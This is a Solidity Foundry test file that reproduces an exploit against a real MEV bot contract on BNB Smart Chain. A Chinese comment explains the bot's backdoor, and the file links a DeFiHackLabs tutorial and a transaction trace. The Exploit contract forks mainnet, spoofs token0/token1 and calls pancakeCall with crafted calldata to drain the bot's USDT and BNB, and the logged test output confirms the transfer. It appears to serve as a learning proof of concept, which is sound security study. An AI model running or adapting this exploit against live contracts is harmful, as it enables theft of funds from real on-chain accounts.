// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./interface.sol";


address constant TOKEN_USDT = address(0x55d398326f99059fF775485246999027B3197955);
address constant TOKEN_BNB = address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
address constant TOKEN_BUSD = address(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

address constant BOT = address(0x64dD59D6C7f09dc05B472ce5CB961b6E10106E1d);

interface IBot{
    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}
/*
MEV Bot 里面有很多token  留了后门   通过  calldata 将地址放进去  然后调用 去提钱 
首先通过 phalcon 查看流程  然后把 机器人的代码 反编译下  最后 在攻击合约补上 token0  token1  swap 函数 

https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/04_write_your_own_poc/
https://phalcon.xyz/tx/bsc/0xd48758ef48d113b78a09f7b8c7cd663ad79e9965852e872fdfc92234c3e598d2
https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/BNB48MEVBot_exp.sol
https://library.dedaub.com/decompile

$ forge test --match-path test/BNB48MEVBot_exp.t.sol  -vvv

Running 1 test for test/BNB48MEVBot_exp.t.sol:Attacker
[PASS] testExploit() (gas: 2455882)
Logs:
  before exploit : attacker USDT balance:  100000000000000000000
  before exploit : attacker BNB balance:  0
  before exploit : BOT USDT balance:  25912948173777791158265
  before exploit : BOT BNB balance:  327931283327916980816
  after exploit : attacker USDT balance:  26012948173777791158265
  after exploit : attacker BNB balance:  327931283327916980816

Test result: ok. 1 passed; 0 failed; finished in 783.43ms
*/
contract Attacker is Test {

    function setUp() public {
       vm.createSelectFork("https://rpc.ankr.com/bsc", 21_297_409);
       vm.label(TOKEN_USDT, "TOKEN_USDT");
       vm.label(TOKEN_BNB, "TOKEN_BNB");
       vm.label(BOT, "BOT");
    }

    function testExploit() public {
        Exploit exploit = new Exploit();
        exploit.bbb();
    }
}


contract Exploit is Test{
    address public _token0;
    address public _token1;

    function bbb() public{
    //   deal(address(TOKEN_USDT), address(this), 100 ether);

       console2.log("before exploit : attacker USDT balance: ", IERC20(TOKEN_USDT).balanceOf(address(this)));
       console2.log("before exploit : attacker BNB balance: ", IERC20(TOKEN_BNB).balanceOf(address(this)));

       uint256 usdt_balance =  IERC20(TOKEN_USDT).balanceOf(BOT);
       uint256 bnb_balance = IERC20(TOKEN_BNB).balanceOf(BOT);
       console2.log("before exploit : BOT USDT balance: ", usdt_balance); 
       console2.log("before exploit : BOT BNB balance: ", bnb_balance); 

       IBot bot = IBot(BOT);

       (_token0,  _token1) = (TOKEN_USDT, TOKEN_USDT);
       bot.pancakeCall(address(this), usdt_balance, 0,  abi.encodePacked(bytes12(0), bytes20(address(this)), bytes32(0), bytes32(0))); 

        (_token0,  _token1) = (TOKEN_BNB, TOKEN_BNB);
       bot.pancakeCall(address(this), bnb_balance, 0,  abi.encodePacked(bytes12(0), bytes20(address(this)), bytes32(0), bytes32(0))); 

       console2.log("after exploit : attacker USDT balance: ", IERC20(TOKEN_USDT).balanceOf(address(this)));
       console2.log("after exploit : attacker BNB balance: ", IERC20(TOKEN_BNB).balanceOf(address(this)));
    }

    // 空实现  好像没转钱的操作 
    function swap(uint256 amount0, uint256 amount1, address sender, bytes calldata data) public{

    }

    function token0() public view returns(address){ 
        return _token0;
    }
   
    function token1() public view returns(address){ 
        return _token1;
    }
}
